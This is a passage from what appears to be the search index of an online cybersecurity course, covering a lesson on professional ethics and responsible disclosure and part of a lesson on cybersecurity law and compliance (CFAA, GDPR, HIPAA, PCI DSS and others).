control is human integrity. Technology is only as good as the people using it. In the next lessons, we'll examine specific cyber threats and attack techniques. Understanding these isn't about learning to attack\u2014it's about learning to defend. Keep your ethical foundation in mind as we explore the darker side of cybersecurity.","title":"Lesson 8.1"},{"location":"LECTURES/unit8/lesson8-1/#the-ethical-side-of-cybersecurity","text":"You now have significant knowledge that could be used for harm. You understand networks, can write scripts, know how to capture packets, and comprehend encryption. This lesson is about the responsibility that comes with that knowledge.","title":"The Ethical Side of Cybersecurity"},{"location":"LECTURES/unit8/lesson8-1/#why-ethics-matter-in-cybersecurity","text":"Cybersecurity skills are powerful. The same techniques used to defend systems can be used to attack them. The difference between a security professional and a criminal often comes down to permission, intent, and ethical boundaries. Consider: - The skills to test for SQL injection can also exploit vulnerable websites - The ability to capture network traffic can intercept private communications - Knowledge of malware can be used to create or stop it - Access control expertise can secure systems or bypass them You will be tempted. You'll find vulnerabilities in systems. You'll have access to sensitive data. You'll have opportunities to abuse your skills. Your ethical foundation is what will guide your decisions when no one is watching.","title":"Why Ethics Matter in Cybersecurity"},{"location":"LECTURES/unit8/lesson8-1/#core-ethical-principles","text":"","title":"Core Ethical Principles"},{"location":"LECTURES/unit8/lesson8-1/#1-do-no-harm","text":"The first rule: don't cause damage. This means: - Don't access systems without authorization - Don't modify data you're not supposed to - Don't disrupt services - Don't create malware for malicious purposes - Don't steal information - Don't facilitate harm to others Even if you could easily hack something, that doesn't make it right or legal.","title":"1. Do No Harm"},{"location":"LECTURES/unit8/lesson8-1/#2-respect-privacy","text":"People have a right to privacy. As a security professional, you'll often have access to private information: - User credentials - Personal communications - Financial data - Medical records - Private photos and documents You must protect this information , even if it's technically within your power to access or share it. Just because you can see someone's data doesn't mean you should .","title":"2. Respect Privacy"},{"location":"LECTURES/unit8/lesson8-1/#3-get-permission-first","text":"Never test security without explicit permission. This cannot be overstated. Authorized testing: - Written permission from system owner - Clearly defined scope - Time boundaries - Rules of engagement - Point of contact Unauthorized testing: - \"But I was helping!\" is not a legal defense - Can result in criminal charges - Can ruin your career - Can cause real damage If you find a vulnerability accidentally, report it responsibly\u2014don't exploit it.","title":"3. Get Permission First"},{"location":"LECTURES/unit8/lesson8-1/#4-responsible-disclosure","text":"When you discover a vulnerability: Good approach (Responsible Disclosure): 1. Document the vulnerability 2. Contact the vendor/owner through proper channels 3. Give them reasonable time to fix it (usually 90 days) 4. Don't publicly disclose until patched 5. May disclose after patch or deadline Bad approaches: - Full disclosure : Immediately publicizing vulnerability before patch - Extortion : Demanding payment for vulnerability info - Weaponizing : Selling to criminals or nation-states - Silent exploitation : Using vulnerability without telling anyone Coordinated disclosure is the industry standard\u2014work with vendors to fix issues before they're exploited.","title":"4. Responsible Disclosure"},{"location":"LECTURES/unit8/lesson8-1/#5-transparency-and-honesty","text":"Be honest about: - Your findings in security assessments - Your capabilities and limitations - Conflicts of interest - When you make mistakes Don't: - Exaggerate threats to get business - Hide vulnerabilities you're supposed to report - Claim credit for others' work - Lie about credentials or experience Your reputation is built on trust. One act of dishonesty can destroy a career.","title":"5. Transparency and Honesty"},{"location":"LECTURES/unit8/lesson8-1/#legal-frameworks","text":"Ethics and law overlap but aren't identical. Something can be unethical but legal, or ethical but illegal in certain jurisdictions. However, security professionals must understand the legal landscape.","title":"Legal Frameworks"},{"location":"LECTURES/unit8/lesson8-1/#computer-fraud-and-abuse-act-cfaa-usa","text":"The primary US law governing computer crimes: - Accessing computers without authorization - Exceeding authorized access - Causing damage to computer systems - Trafficking in passwords - Threatening to damage computers (extortion) Penalties : Fines and imprisonment, severity depends on damage and intent Controversial aspects : Vague language has led to concerning prosecutions, including researchers testing security.","title":"Computer Fraud and Abuse Act (CFAA) - USA"},{"location":"LECTURES/unit8/lesson8-1/#computer-misuse-act-uk","text":"Similar to CFAA: - Unauthorized access to computer material - Unauthorized access with intent to commit further offenses - Unauthorized modification of computer material - Making, supplying, or obtaining tools for computer misuse","title":"Computer Misuse Act - UK"},{"location":"LECTURES/unit8/lesson8-1/#other-relevant-laws","text":"GDPR (General Data Protection Regulation) - EU: - Strict data protection requirements - Heavy fines for breaches - Right to be forgotten - Data portability HIPAA - USA healthcare data: - Protects medical information - Strict access controls required - Severe penalties for violations COPPA - USA children's privacy: - Protects children under 13 online - Parental consent requirements State/local laws : Many jurisdictions have additional computer crime laws","title":"Other Relevant Laws"},{"location":"LECTURES/unit8/lesson8-1/#international-considerations","text":"Cybersecurity is global, but laws are local: - Actions legal in your country may be illegal elsewhere - Accessing systems in another country can violate their laws - Extradition treaties may apply - Corporate espionage is illegal internationally Always understand the legal jurisdiction of systems you're working with.","title":"International Considerations"},{"location":"LECTURES/unit8/lesson8-1/#professional-codes-of-conduct","text":"Several organizations provide ethical frameworks for cybersecurity professionals:","title":"Professional Codes of Conduct"},{"location":"LECTURES/unit8/lesson8-1/#isc2-code-of-ethics","text":"For CISSP and other certifications: 1. Protect society, the common good, necessary public trust and confidence, and the infrastructure 2. Act honorably, honestly, justly, responsibly, and legally 3. Provide diligent and competent service to principals 4. Advance and protect the profession","title":"(ISC)\u00b2 Code of Ethics"},{"location":"LECTURES/unit8/lesson8-1/#ec-council-code-of-ethics","text":"For CEH (Certified Ethical Hacker): - Keep private information confidential - Not use hacking knowledge for personal gain - Not cause damage to clients' systems - Inform organizations of vulnerabilities - Not violate intellectual property rights","title":"EC-Council Code of Ethics"},{"location":"LECTURES/unit8/lesson8-1/#acm-code-of-ethics","text":"For computer professionals: - Contribute to society and human well-being - Avoid harm - Be honest and trustworthy - Be fair and take action not to discriminate - Respect privacy - Honor confidentiality These frameworks help guide decisions in gray areas.","title":"ACM Code of Ethics"},{"location":"LECTURES/unit8/lesson8-1/#ethical-dilemmas-in-cybersecurity","text":"Let's examine some realistic scenarios:","title":"Ethical Dilemmas in Cybersecurity"},{"location":"LECTURES/unit8/lesson8-1/#scenario-1-the-accidental-discovery","text":"You're browsing a company website and notice a URL parameter. Out of curiosity, you change it and discover you can access other users' account information. No one knows you found this. Ethical considerations: - You didn't intend to find this, but now you have - Other malicious actors could find it too - Users' data is at risk - You've technically accessed unauthorized data Right approach: 1. Stop accessing the vulnerability immediately 2. Document what you found (screenshots, URLs) 3. Report to the company through security@company.com or responsible disclosure program 4. Don't access further data or share the vulnerability 5. Give them time to fix before any public disclosure Wrong approaches: - \"Testing\" further to see how bad it is (unauthorized access) - Telling friends or posting on social media - Ignoring it (users remain at risk) - Demanding money to disclose it (extortion)","title":"Scenario 1: The Accidental Discovery"},{"location":"LECTURES/unit8/lesson8-1/#scenario-2-the-security-job-offer","text":"A company offers you a job to test their competitor's security\u2014without the competitor's knowledge. Ethical considerations: - This is corporate espionage - It's illegal - It's unethical - Could destroy your career and lead to criminal charges Right approach: Decline immediately. This is criminal activity, regardless of how it's framed. Red flags: - Testing systems you don't own - No written authorization - Targeting competitors - Requests for \"gray area\" work","title":"Scenario 2: The Security Job Offer"},{"location":"LECTURES/unit8/lesson8-1/#scenario-3-the-insecure-client","text":"During a penetration test, you find the client's CEO has terrible password hygiene and is accessing adult websites on company time. Ethical considerations: - Your job is security testing, not morality policing - CEO's personal behavior isn't your business unless it's a security risk - You have a duty to report security issues - You shouldn't gossip or shame Right approach: - Report weak passwords as security findings - If adult sites are malicious or violate policy, report the security risk - Don't mention personal details that aren't relevant to security - Maintain confidentiality","title":"Scenario 3: The Insecure Client"},{"location":"LECTURES/unit8/lesson8-1/#scenario-4-the-national-security-request","text":"A government agency asks you to create a backdoor in your company's encryption software \"for national security.\" Ethical considerations: - Backdoors undermine security for everyone - You'd be compromising your users - May be legally required in some jurisdictions - May violate users' trust and privacy Considerations: - Consult with company legal team - Understand legal obligations - Consider resigning if you can't ethically comply - Whistleblower protections may apply This is genuinely complex and depends on jurisdiction, laws, and personal values.","title":"Scenario 4: The National Security Request"},{"location":"LECTURES/unit8/lesson8-1/#scenario-5-the-vulnerability-in-your-own-product","text":"You discover a severe vulnerability in software your team shipped. Fixing it is expensive and time-consuming. Your manager wants to delay. Ethical considerations: - Users are at risk - Disclosure could hurt company reputation - You have responsibility to both employer and users - Legal liability if breach occurs Right approach: - Document the vulnerability - Advocate strongly for immediate fix - Escalate if manager refuses - Consider whistleblower options if company ignores serious risk - Never help cover up serious vulnerabilities","title":"Scenario 5: The Vulnerability in Your Own Product"},{"location":"LECTURES/unit8/lesson8-1/#the-gray-areas","text":"Not everything in cybersecurity is black and white:","title":"The Gray Areas"},{"location":"LECTURES/unit8/lesson8-1/#security-research","text":"Is it ethical to: - Probe your own systems? (Yes, with permission) - Test open-source software for vulnerabilities? (Yes, responsibly) - Reverse engineer malware? (Yes, for defense) - Examine protocols and find flaws? (Yes, with responsible disclosure) - Buy zero-day vulnerabilities? (Complicated\u2014depends on use) - Create proof-of-concept exploits? (Yes, if not weaponized)","title":"Security Research"},{"location":"LECTURES/unit8/lesson8-1/#offensive-security","text":"Can you ethically: - Perform penetration testing? (Yes, with authorization) - Develop exploit tools? (Yes, if used ethically) - Simulate attacks? (Yes, in controlled environments) - Teach exploitation techniques? (Yes, education is important) - Participate in red teaming? (Yes, with proper agreements)","title":"Offensive Security"},{"location":"LECTURES/unit8/lesson8-1/#privacy-vs-security","text":"Sometimes these conflict: - Monitoring employee activity (security vs. privacy) - Encryption backdoors (security of some vs. privacy of all) - Data retention (incident investigation vs. data minimization) - Surveillance programs (national security vs. civil liberties) These require careful balancing and informed debate.","title":"Privacy vs. Security"},{"location":"LECTURES/unit8/lesson8-1/#building-your-ethical-framework","text":"How do you make ethical decisions?","title":"Building Your Ethical Framework"},{"location":"LECTURES/unit8/lesson8-1/#the-four-way-test","text":"Ask yourself: 1. Is it the truth? Am I being honest? 2. Is it fair to all concerned? Am I treating everyone fairly? 3. Will it build goodwill and better relationships? Am I helping or harming trust? 4. Will it be beneficial to all concerned? Is this a net positive?","title":"The Four-Way Test"},{"location":"LECTURES/unit8/lesson8-1/#the-publicity-test","text":"Would you be comfortable with your actions appearing on the front page of a newspaper with your name attached?","title":"The Publicity Test"},{"location":"LECTURES/unit8/lesson8-1/#the-reversibility-test","text":"If someone did this to you or your organization, how would you feel?","title":"The Reversibility Test"},{"location":"LECTURES/unit8/lesson8-1/#the-professional-test","text":"Would respected professionals in your field approve of this action?","title":"The Professional Test"},{"location":"LECTURES/unit8/lesson8-1/#the-legal-test","text":"Is this legal in all relevant jurisdictions? If you're uncertain, err on the side of caution and seek advice.","title":"The Legal Test"},{"location":"LECTURES/unit8/lesson8-1/#ethical-decision-making-process","text":"When facing an ethical dilemma: Identify the issue : What's the ethical question? Gather information : What are the facts? What are the laws? Identify stakeholders : Who is affected? Consider alternatives : What are your options? Evaluate consequences : What happens with each option? Make a decision : Based on ethical principles and professional standards Implement : Act on your decision Reflect : Was it the right choice? What did you learn? Document your reasoning. If questioned later, you can explain your thinking.","title":"Ethical Decision-Making Process"},{"location":"LECTURES/unit8/lesson8-1/#professional-responsibility","text":"As your skills grow, so does your responsibility:","title":"Professional Responsibility"},{"location":"LECTURES/unit8/lesson8-1/#duty-to-clientsemployers","text":"Perform work competently Maintain confidentiality Act in their best interest Report findings honestly Stay within scope of engagement","title":"Duty to Clients/Employers"},{"location":"LECTURES/unit8/lesson8-1/#duty-to-society","text":"Don't facilitate criminal activity Protect critical infrastructure Contribute to security knowledge Mentor others responsibly Advocate for better security practices","title":"Duty to Society"},{"location":"LECTURES/unit8/lesson8-1/#duty-to-the-profession","text":"Uphold professional standards Report unethical behavior Continue learning and improving Share knowledge appropriately Don't undermine trust in the field","title":"Duty to the Profession"},{"location":"LECTURES/unit8/lesson8-1/#duty-to-yourself","text":"Don't compromise your integrity Don't accept work you're not qualified for Maintain work-life balance Seek support when facing ethical dilemmas Know when to walk away","title":"Duty to Yourself"},{"location":"LECTURES/unit8/lesson8-1/#red-flags-and-warning-signs","text":"Situations that should concern you: Requests that: - Violate laws or professional codes - Target systems without authorization - Ask you to lie or conceal information - Involve malicious intent - Lack proper documentation - Require secrecy from normal oversight - Pressure you to act without time to think Trust your instincts. If something feels wrong, it probably is. Seek advice from mentors, legal counsel, or professional organizations.","title":"Red Flags and Warning Signs"},{"location":"LECTURES/unit8/lesson8-1/#career-implications","text":"Ethics isn't just philosophical\u2014it's practical: Good ethics: - Build reputation and trust - Create career opportunities - Lead to referrals and recommendations - Provide job satisfaction - Enable you to sleep at night Poor ethics: - Destroy careers permanently - Lead to criminal charges - Result in professional blacklisting - Cause personal and family hardship - Eliminate future opportunities The cybersecurity community is smaller than you think. Reputation matters.","title":"Career Implications"},{"location":"LECTURES/unit8/lesson8-1/#ethical-hacking-vs-criminal-hacking","text":"Let's be clear about the distinction: Ethical Hacker (White Hat): - Has explicit permission - Works within defined scope - Reports findings to owners - Follows responsible disclosure - Aims to improve security - Respects privacy and laws Criminal Hacker (Black Hat): - No permission - Targets for personal gain - Steals or damages data - Exploits vulnerabilities - Operates illegally - Causes harm Gray Hat: - No permission but no malicious intent - Discovers vulnerabilities and reports them - Still illegal in most jurisdictions - Risky and not recommended Your goal should always be to operate as a white hat professional.","title":"Ethical Hacking vs. Criminal Hacking"},{"location":"LECTURES/unit8/lesson8-1/#real-world-examples","text":"Aaron Swartz : Downloaded academic articles from JSTOR. Faced disproportionate criminal charges under CFAA. Tragic case that sparked debate about computer fraud laws. Marcus Hutchins : Security researcher who stopped WannaCry ransomware. Later charged with creating malware years earlier. Eventually pleaded guilty but received no jail time. Complex case involving past mistakes and later redemption. Weev : Found vulnerability in AT&T website exposing iPad users' emails. Convicted under CFAA, conviction later overturned. Controversial case about what constitutes \"unauthorized access.\" These cases show the complexity and serious consequences of operating in ethical gray areas.","title":"Real-World Examples"},{"location":"LECTURES/unit8/lesson8-1/#moving-forward","text":"As you continue in cybersecurity: Know the laws in your jurisdiction Follow professional codes of conduct Get everything in writing before testing systems Think before you act - pause when facing ethical dilemmas Seek mentorship from experienced ethical professionals Stay informed about legal and ethical developments Contribute positively to the security community Speak up when you see unethical behavior Document your decisions and reasoning Never compromise your integrity","title":"Moving Forward"},{"location":"LECTURES/unit8/lesson8-1/#conclusion","text":"Ethics in cybersecurity isn't about following arbitrary rules. It's about: - Respecting people's rights and privacy - Using power responsibly - Building trust - Contributing to a safer digital world - Maintaining professional standards You have or will have significant power. Systems will be vulnerable to you. Private information will be accessible. Organizations will trust you. How you handle that power defines who you are as a professional. The skills you're learning are tools. Like any tool, they can build or destroy. Your ethical framework determines which. Choose wisely. Your decisions will affect not just your career, but the lives of others and the security of systems we all depend on. Remember : The most important security control is human integrity. Technology is only as good as the people using it. In the next lessons, we'll examine specific cyber threats and attack techniques. Understanding these isn't about learning to attack\u2014it's about learning to defend. Keep your ethical foundation in mind as we explore the darker side of cybersecurity.","title":"Conclusion"},{"location":"LECTURES/unit8/lesson8-2/","text":"Legal Frameworks and Compliance Ethics guide your choices, but laws and regulations enforce them. This lesson covers the legal landscape of cybersecurity\u2014what you must know to stay on the right side of the law and help organizations remain compliant. Criminal Laws Computer Fraud and Abuse Act (CFAA) - United States The CFAA makes it illegal to: - Access a computer without authorization - Exceed authorized access - Cause damage to protected computers - Obtain information through unauthorized access - Traffic in passwords - Threaten to cause damage Key provisions: 18 U.S.C. \u00a7 1030(a)(1) - Accessing classified information 18 U.S.C. \u00a7 1030(a)(2) - Obtaining information from protected computers 18 U.S.C. \u00a7 1030(a)(3) - Accessing government computers 18 U.S.C. \u00a7 1030(a)(4) - Fraud via computer 18 U.S.C. \u00a7 1030(a)(5) - Damaging protected computers 18 U.S.C. \u00a7 1030(a)(6) - Trafficking in passwords 18 U.S.C. \u00a7 1030(a)(7) - Extortion via computer \"Protected computer\" = any computer used in interstate commerce (basically all of them) Penalties: - First offense: Up to 5 years - Second offense: Up to 10 years - Causing damage: Up to 10 years - With intent to extort: Up to 20 years Controversial aspects: - Broad interpretation of \"unauthorized access\" - Terms of Service violations potentially criminal - Aaron Swartz case highlighted problems - Ongoing debates about reform Computer Misuse Act 1990 (CMA) - United Kingdom Three main offenses: Section 1: Unauthorized access - Penalty: Up to 2 years imprisonment - Covers: Accessing any computer without permission Section 2: Unauthorized access with intent - Penalty: Up to 5 years imprisonment - Covers: Accessing to commit further crimes Section 3: Unauthorized modification - Penalty: Up to 10 years imprisonment - Covers: Modifying computer material (malware, defacement) Section 3A: Making, supplying, or obtaining tools - Penalty: Up to 2 years (summary), 10 years (indictment) - Covers: Hacking tools, exploits Other Criminal Laws Electronic Communications Privacy Act (ECPA) - Prohibits interception of electronic communications - Covers email, phone calls, data transmissions - Stored Communications Act (SCA) is part of ECPA Wire Fraud Statute (18 U.S.C. \u00a7 1343) - Using electronic communications for fraud - Applies to many cybercrimes Identity Theft and Assumption Deterrence Act - Criminalizes identity theft - Federal crime to use another's identity Economic Espionage Act - Protects trade secrets - Criminal penalties for theft Data Protection and Privacy Laws General Data Protection Regulation (GDPR) - EU Scope: - Applies to EU residents' data - Extraterritorial (applies to companies outside EU) - Covers personal data processing Key principles: 1. Lawfulness, fairness, transparency 2. Purpose limitation (collect for specific purposes) 3. Data minimization (only collect what's needed) 4. Accuracy (keep data accurate and up to date) 5. Storage limitation (don't keep longer than necessary) 6. Integrity and confidentiality (security) 7. Accountability (demonstrate compliance) Data subject rights: - Right to access - Right to rectification - Right to erasure (\"right to be forgotten\") - Right to restrict processing - Right to data portability - Right to object - Rights related to automated decision-making Security requirements: - Pseudonymization and encryption - Ability to ensure confidentiality, integrity, availability - Ability to restore availability after incident - Regular testing and evaluation Breach notification: - Must notify supervisory authority within 72 hours - Must notify affected individuals if high risk - Document all breaches Penalties: - Up to \u20ac20 million OR 4% of global annual revenue - Whichever is higher Data Protection Officer (DPO): - Required for public authorities - Required for large-scale monitoring - Required for large-scale processing of sensitive data California Consumer Privacy Act (CCPA) / CPRA Consumer rights: - Know what personal information is collected - Know whether information is sold or disclosed - Say no to sale of information - Access personal information - Request deletion - Equal service and price Business obligations: - Provide privacy notice - Respond to consumer requests - Don't discriminate against consumers exercising rights - Implement reasonable security Penalties: - Up to $7,500 per intentional violation - Up to $2,500 per violation - Private right of action for data breaches Health Insurance Portability and Accountability Act (HIPAA) Applies to: - Healthcare providers - Health plans - Healthcare clearinghouses - Business associates Protected Health Information (PHI): - Any health information that can identify individual - Includes medical records, payment information, etc. Privacy Rule: - Limits use and disclosure of PHI - Gives patients rights over their information - Requires written authorization for most uses Security Rule: - Administrative safeguards - Physical safeguards - Technical safeguards - Requires risk assessments Breach Notification Rule: - Notify affected individuals - Notify HHS (Department of Health and Human Services) - Media notification if >500 people affected Penalties: - Tier 1: $100-$50,000 per violation (unknowing) - Tier 2: $1,000-$50,000 (reasonable cause) - Tier 3: $10,000-$50,000 (willful neglect, corrected) - Tier 4: $50,000+ (willful neglect, not corrected) - Criminal penalties possible Payment Card Industry Data Security Standard (PCI DSS) Not a law, but contractually required by card companies 12 requirements: 1. Install and maintain firewall configuration 2. Don't use vendor-supplied defaults 3. Protect stored cardholder data 4. Encrypt transmission of cardholder data 5. Protect systems against malware 6. Develop and maintain secure systems 7. Restrict access to cardholder data 8. Identify and authenticate access 9. Restrict physical access to cardholder data 10. Track and monitor network access 11. Regularly test security systems 12. Maintain information security policy Compliance levels: - Level 1: 6+ million transactions/year (annual onsite audit) - Level 2: 1-6 million transactions/year (annual self-assessment) - Level 3: 20,000-1 million e-commerce (annual self-assessment) - Level 4: <20,000 e-commerce or <1 million (annual self-assessment) Penalties: - Fines from card brands ($5,000-$100,000/month) - Increased transaction fees - Loss of ability to process cards Sector-Specific Regulations Financial Services Gramm-Leach-Bliley Act (GLBA) - Financial institutions must protect customer information - Privacy notices required - Opt-out for information sharing Sarbanes-Oxley Act (SOX) - Internal controls over financial reporting - IT controls are part of this - Criminal penalties for executives New York Department of Financial Services (NYDFS) Cybersecurity Regulation - Applies to financial institutions in NY - Requires cybersecurity program - Annual certification to superintendent - Incident response plan required Critical Infrastructure NERC CIP (North American Electric Reliability Corporation Critical Infrastructure Protection) - Standards for electric grid security - Mandatory for utilities - Covers physical and cyber security Transportation Security Administration (TSA) Security Directives - Apply to pipelines, rail, aviation - Cybersecurity requirements - Incident reporting International Laws China Cybersecurity Law Key provisions: - Data localization (critical data must stay in China) - Network security reviews - Real-name registration - Cooperation with authorities Australia Privacy Act Australian Privacy Principles (APPs) - 13 principles for handling personal information - Covers collection, use, disclosure, security - Notifiable Data Breaches scheme Brazil LGPD (Lei Geral de Prote\u00e7\u00e3o de Dados) Similar to GDPR: - Data subject rights - Consent requirements - Security requirements - Breach notification Compliance Frameworks NIST Cybersecurity Framework Five functions: 1. Identify - Asset management, risk assessment 2. Protect - Access control, training, data security 3. Detect - Monitoring, detection processes 4. Respond - Response planning, communications 5. Recover - Recovery planning, improvements Not mandatory but widely adopted - Referenced by regulations - Used for assessments - Industry standard ISO 27001/27002 ISO 27001: Information Security Management System (ISMS) - Certification available - Requires risk assessment - Continuous improvement ISO 27002: Code of practice - Detailed controls - Implementation guidance 14 control domains: 1. Information security policies 2. Organization of information security 3. Human resource security 4. Asset management 5. Access control 6. Cryptography 7. Physical and environmental security 8. Operations security 9. Communications security 10. System acquisition, development, maintenance 11. Supplier relationships 12. Incident management 13. Business continuity 14. Compliance SOC 2 (System and Organization Controls) Trust Services Criteria: - Security (required for all) - Availability - Processing integrity - Confidentiality - Privacy Two types: - Type I: Design of controls at point in time - Type II: Operating effectiveness over period (6-12 months) Used for: SaaS vendors, cloud providers, service organizations Compliance in Practice Risk Assessments Required by many regulations Steps: 1. Identify assets 2. Identify threats 3. Identify vulnerabilities 4. Determine likelihood 5. Determine impact 6. Calculate risk 7. Prioritize 8. Implement controls 9. Monitor and review Policies and Procedures Required documents: - Information security policy - Acceptable use policy - Incident response plan - Business continuity plan - Disaster recovery plan - Data retention policy - Vendor management policy - Change management procedures Policy structure: 1. Purpose 2. Scope 3. Definitions 4. Policy statements 5. Responsibilities 6. Enforcement 7. Review and updates Training and Awareness Required by most regulations Topics: - Security basics - Phishing awareness - Password security - Data handling - Incident reporting - Compliance requirements Frequency: - Annual training minimum - New hire training - Role-specific training - Ad-hoc training for threats Audit and Assessment Internal audits: - Regular self-assessments - Verify controls are working - Identify gaps External audits: - Independent verification - Required for some regulations - Provides assurance to stakeholders Penetration testing: - Test security controls - Identify vulnerabilities - Often required annually Incident Response and Reporting Notification requirements vary: GDPR: 72 hours to authority HIPAA: 60 days to individuals PCI DSS: Immediately to acquiring bank State breach laws: Varies (typically 30-90 days) What to report: - Nature of breach - Data involved - Number of affected individuals - Remediation steps - Contact information Documentation Critical for compliance: - Policies and procedures - Risk assessments - Training records - Audit logs - Incident reports - Vendor assessments - Business associate agreements - Data processing agreements Retention requirements vary: - HIPAA: 6 years - SOX: 7 years - GDPR: As long as necessary - PCI DSS: 1 year minimum Consequences of Non-Compliance Regulatory Fines Can be massive: - British Airways: \u00a320 million (GDPR) - Marriott: \u00a318.4 million (GDPR) - Equifax: $575 million (FTC settlement) - Capital One: $80 million (OCC fine) Lawsuits Private right of action: - Data breach class actions - Can be costly even if settled - Reputation damage Business Impact Beyond fines: - Loss of customers - Reputation damage - Inability to process payments (PCI) - Loss of contracts - Stock price impact - Executive turnover Criminal Charges Possible for: - Willful violations - Obstruction - False statements - Executives can be personally liable Staying Compliant Continuous Monitoring Don't wait for audits: - Regular vulnerability scans - Log monitoring - Access reviews - Configuration reviews - Vendor assessments Change Management Updates can break compliance: - Document changes - Assess impact on security - Test before deploying - Update documentation Vendor Management Third parties are your responsibility: - Due diligence before selection - Contractual requirements - Regular assessments - Incident response coordination - Right to audit Keep Current Laws and regulations change: - Subscribe to updates - Attend conferences - Professional associations - Legal counsel - Compliance consultants Practical Compliance Checklist GDPR Compliance: - [ ] Data inventory completed - [ ] Lawful basis identified for processing - [ ] Privacy notices updated - [ ] Data subject request procedures - [ ] Breach notification procedures - [ ] DPO appointed (if required) - [ ] Data protection impact assessments - [ ] Vendor agreements updated - [ ] Staff training completed - [ ] Technical and organizational measures HIPAA Compliance: - [ ] Risk assessment completed - [ ] Policies and procedures documented - [ ] Business associate agreements - [ ] Encryption implemented - [ ] Access controls - [ ] Audit logging - [ ] Training completed - [ ] Incident response plan - [ ] Breach notification procedures - [ ] Physical security measures PCI DSS Compliance: - [ ] Cardholder data inventory - [ ] Network segmentation - [ ] Firewall configuration - [ ] No default passwords - [ ] Data encryption - [ ] Malware protection - [ ] Secure systems and applications - [ ] Access control - [ ] Unique IDs - [ ] Physical access restrictions - [ ] Logging and monitoring - [ ] Security testing - [ ] Information security policy Key Takeaways Legal landscape: - Criminal laws punish unauthorized access - Privacy laws protect personal data - Sector regulations add requirements - International laws create complexity - Compliance frameworks provide structure Your responsibilities: - Know the laws that apply - Implement required controls - Document everything - Train users - Monitor continuously - Report incidents properly Compliance is not security: - Meeting minimum requirements \u2260 secure - Security should exceed compliance - But compliance is mandatory baseline Remember: - Ignorance is not a defense - Personal liability is possible - Non-compliance is expensive - Compliance is ongoing, not one-time - Get legal advice when uncertain Understanding legal requirements is essential for security professionals. You need to protect your organization legally as well as technically. This knowledge helps you make informed decisions and avoid costly violations.","title":"Lesson 8.2"},{"location":"LECTURES/unit8/lesson8-2/#legal-frameworks-and-compliance","text":"Ethics guide your choices, but laws and regulations enforce them. This lesson covers the legal landscape of cybersecurity\u2014what you must know to stay on the right side of the law and help organizations remain compliant.","title":"Legal Frameworks and Compliance"},{"location":"LECTURES/unit8/lesson8-2/#criminal-laws","text":"","title":"Criminal Laws"},{"location":"LECTURES/unit8/lesson8-2/#computer-fraud-and-abuse-act-cfaa-united-states","text":"The CFAA makes it illegal to: - Access a computer without authorization - Exceed authorized access - Cause damage to protected computers - Obtain information through unauthorized access - Traffic in passwords - Threaten to cause damage Key provisions: 18 U.S.C. \u00a7 1030(a)(1) - Accessing classified information 18 U.S.C. \u00a7 1030(a)(2) - Obtaining information from protected computers 18 U.S.C. \u00a7 1030(a)(3) - Accessing government computers 18 U.S.C. \u00a7 1030(a)(4) - Fraud via computer 18 U.S.C. \u00a7 1030(a)(5) - Damaging protected computers 18 U.S.C. \u00a7 1030(a)(6) - Trafficking in passwords 18 U.S.C. \u00a7 1030(a)(7) - Extortion via computer \"Protected computer\" = any computer used in interstate commerce (basically all of them) Penalties: - First offense: Up to 5 years - Second offense: Up to 10 years - Causing damage: Up to 10 years - With intent to extort: Up to 20 years Controversial aspects: - Broad interpretation of \"unauthorized access\" - Terms of Service violations potentially criminal - Aaron Swartz case highlighted problems - Ongoing debates about reform","title":"Computer Fraud and Abuse Act (CFAA) - United States"},{"location":"LECTURES/unit8/lesson8-2/#computer-misuse-act-1990-cma-united-kingdom","text":"Three main offenses: Section 1: Unauthorized access - Penalty: Up to 2 years imprisonment - Covers: Accessing any computer without permission Section 2: Unauthorized access with intent - Penalty: Up to 5 years imprisonment - Covers: Accessing to commit further crimes Section 3: Unauthorized modification - Penalty: Up to 10 years imprisonment - Covers: Modifying computer material (malware, defacement) Section 3A: Making, supplying, or obtaining tools - Penalty: Up to 2 years (summary), 10 years (indictment) - Covers: Hacking tools, exploits","title":"Computer Misuse Act 1990 (CMA) - United Kingdom"},{"location":"LECTURES/unit8/lesson8-2/#other-criminal-laws","text":"Electronic Communications Privacy Act (ECPA) - Prohibits interception of electronic communications - Covers email, phone calls, data transmissions - Stored Communications Act (SCA) is part of ECPA Wire Fraud Statute (18 U.S.C. \u00a7 1343) - Using electronic communications for fraud - Applies to many cybercrimes Identity Theft and Assumption Deterrence Act - Criminalizes identity theft - Federal crime to use another's identity Economic Espionage Act - Protects trade secrets - Criminal penalties for theft","title":"Other Criminal Laws"},{"location":"LECTURES/unit8/lesson8-2/#data-protection-and-privacy-laws","text":"","title":"Data Protection and Privacy Laws"},{"location":"LECTURES/unit8/lesson8-2/#general-data-protection-regulation-gdpr-eu","text":"Scope: - Applies to EU residents' data - Extraterritorial (applies to companies outside EU) - Covers personal data processing Key principles: 1. Lawfulness, fairness, transparency 2. Purpose limitation (collect for specific purposes) 3. Data minimization (only collect what's needed) 4. Accuracy (keep data accurate and up to date) 5. Storage limitation (don't keep longer than necessary) 6. Integrity and confidentiality (security) 7. Accountability (demonstrate compliance) Data subject rights: - Right to access - Right to rectification - Right to erasure (\"right to be forgotten\") - Right to restrict processing - Right to data portability - Right to object - Rights related to automated decision-making Security requirements: - Pseudonymization and encryption - Ability to ensure confidentiality, integrity, availability - Ability to restore availability after incident - Regular testing and evaluation Breach notification: - Must notify supervisory authority within 72 hours - Must notify affected individuals if high risk - Document all breaches Penalties: - Up to \u20ac20 million OR 4% of global annual revenue - Whichever is higher Data Protection Officer (DPO): - Required for public authorities - Required for large-scale monitoring - Required for large-scale processing of sensitive data","title":"General Data Protection Regulation (GDPR) - EU"},{"location":"LECTURES/unit8/lesson8-2/#california-consumer-privacy-act-ccpa-cpra","text":"Consumer rights: - Know what personal information is collected - Know whether information is sold or disclosed - Say no to sale of information - Access personal information - Request deletion - Equal service and price Business obligations: - Provide privacy notice - Respond to consumer requests - Don't discriminate against consumers exercising rights - Implement reasonable security Penalties: - Up to $7,500 per intentional violation - Up to $2,500 per violation - Private right of action for data breaches","title":"California Consumer Privacy Act (CCPA) / CPRA"},{"location":"LECTURES/unit8/lesson8-2/#health-insurance-portability-and-accountability-act-hipaa","text":"Applies to: - Healthcare providers - Health plans - Healthcare clearinghouses - Business associates Protected Health Information (PHI): - Any health information that can identify individual - Includes medical records, payment information, etc. Privacy Rule: - Limits use and disclosure of PHI - Gives patients rights over their information - Requires written authorization for most uses Security Rule: - Administrative safeguards - Physical safeguards - Technical safeguards - Requires risk assessments Breach Notification Rule: - Notify affected individuals - Notify HHS (Department of Health and Human Services) - Media notification if >500 people affected Penalties: - Tier 1: $100-$50,000 per violation (unknowing) - Tier 